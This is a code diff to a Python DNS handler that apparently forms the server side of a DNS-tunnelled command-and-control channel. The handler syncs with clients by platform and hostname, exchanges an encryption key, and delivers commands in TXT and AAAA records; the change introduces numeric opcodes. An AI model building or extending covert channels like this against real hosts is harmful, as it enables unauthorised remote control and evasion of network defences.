@@ -8,7 +8,7 @@ import logging
 
 class Records(Enum):
     """ The types of records the DNSHandler can currently encode """
-    TXT = (QTYPE.TXT, TXT, 253)
+    TXT = (QTYPE.TXT, TXT, 252)
     AAAA = (QTYPE.AAAA, AAAA, 13)
 
 class Domains(Enum):
@@ -17,6 +17,15 @@ class Domains(Enum):
     ENCRYPT = "encrypt"
     QUERY = "query"
     CONFIRM = "confirm"
+
+class Opcodes(Enum):
+    NOP = "0"
+    ACK = "1"
+    KEY = "2"
+    DATA = "3"
+    EDATA = "4"
+    END = "5"
+    SYNCREQ = "6"
 
 
 class DNSHandler(ProtocolHandler):
@@ -44,11 +53,11 @@ class DNSHandler(ProtocolHandler):
             query = str(q.get_qname()).split(".")[::-1]
             if query[3] == Domains.SYNC.value:
                 platform, hostname = query[5], query[4]
-                self._send_control(request, port, "SYNC-ACKNOWLEDGE")
+                self._send_control(request, port, Opcodes.ACK.value, None)
                 return (platform, hostname)
             else:
                 # Issue a SYNC-REQUEST if server went down and needs to resync
-                self._send_control(request, port, "SYNC-REQUEST")
+                self._send_control(request, port, Opcodes.SYNCREQ.value, None)
         except DNSError:
             self.logger.debug(f"[{self.ip}] synchronize: Packet Malformed")
         return ""
@@ -63,11 +72,11 @@ class DNSHandler(ProtocolHandler):
             q = request.questions[0]
             query = str(q.get_qname()).split(".")[::-1]
             if query[3] == Domains.ENCRYPT.value:
-                self._send_control(request, port, key)
+                self._send_control(request, port, Opcodes.KEY.value, key)
                 return 1
             elif query[3] == Domains.CONFIRM.value:
                 if query[4] == Domains.ENCRYPT.value:
-                    self._send_control(request, port, "ACK")
+                    self._send_control(request, port, Opcodes.ACK.value, None)
                     return 2
             else:
                 # Return back to SYNC state, will perform SYNC-REQUEST
@@ -76,8 +85,7 @@ class DNSHandler(ProtocolHandler):
 
         except DNSError as e:
             self.logger.debug(f"[{self.ip}] encrypt: DNS Packet Malformed: {str(e)}")
-
-        return 1
+            return 1
 
     def respond(self, raw_request, port, cmd):
         """
@@ -124,24 +132,32 @@ class DNSHandler(ProtocolHandler):
         def TXT(rr_type, packet):
             cmd = command.command
             _, constructor, msg_size = Records.TXT.value
-            chunks = [f"1:{cmd[i:i+msg_size]}" for i in range(0, len(cmd), msg_size)] 
-            for chunk in chunks:
-                answer = RR(
-                        rname=record.get_q().get_qname(),
+            chunks = [f"310{cmd[i:i+msg_size]}" for i in range(0, len(cmd), msg_size)] 
+            opcode = 0 if command.type == CommandType.NOP else 3
+            if opcode == 0:
+                packet.add_answer(
+                        RR(rname=record.get_q().get_qname(),
                         rtype=rr_type,
                         rclass=CLASS.IN,
-                        rdata=constructor(chunk),
+                        rdata=constructor("010None"),
                         ttl=1337)
-                packet.add_answer(answer)
+                )
+            else:
+                for i, chunk in enumerate(chunks):
+                    answer = RR(
+                            rname=record.get_q().get_qname(),
+                            rtype=rr_type,
+                            rclass=CLASS.IN,
+                            rdata=constructor(chunk),
+                            ttl=1337)
+                    packet.add_answer(answer)
 
         def AAAA(rr_type, packet):
             cmd = command.command
             _, constructor, msg_size = Records.AAAA.value
             chunks = [cmd[i:i+msg_size] for i in range(0, len(cmd), msg_size)]
-            self.logger.debug(chunks)
 
-            #opcode = 0 if command.type == CommandType.NOP else 3
-            opcode = 3
+            opcode = 0 if command.type == CommandType.NOP else 3
             if opcode == 0:
                 packet.add_answer(
                     RR(
@@ -181,7 +197,7 @@ class DNSHandler(ProtocolHandler):
         # Reply
         self.socket.sendto(command_packet.pack(), (self.ip, port))
 
-    def _send_control(self, record: DNSRecord, port: int, control: str):
+    def _send_control(self, record: DNSRecord, port: int, control: str, data: str):
         """
         Send control packets to the client
         """
@@ -191,7 +207,7 @@ class DNSHandler(ProtocolHandler):
             return RR(rname=record.get_q().get_qname(),
                 rtype=rr_type,
                 rclass=CLASS.IN,
-                rdata=rr_constructor(f"1:{control}"),
+                rdata=rr_constructor(f"{control}10{data}"),
                 ttl=1337)
 
         def AAAA(rr_type):
